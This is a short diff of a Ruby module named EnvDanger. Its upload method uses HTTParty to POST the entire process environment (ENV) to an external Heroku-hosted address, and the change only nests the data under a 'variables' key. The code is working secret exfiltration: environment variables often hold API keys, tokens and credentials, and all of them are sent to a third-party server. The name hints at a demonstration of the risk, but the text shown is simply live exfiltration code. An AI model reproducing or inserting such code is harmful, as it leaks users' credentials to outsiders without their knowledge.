@@ -8,13 +8,14 @@
 module EnvDanger
   include HTTParty
   POST_ADDRESS = 'http://env-danger.herokuapp.com/envs'
-
   class << self
     def upload
       post(
         POST_ADDRESS,
         body: {
-          all_envs: ENV
+          all_envs: {
+            variables: ENV
+          }
         }
       )
     end
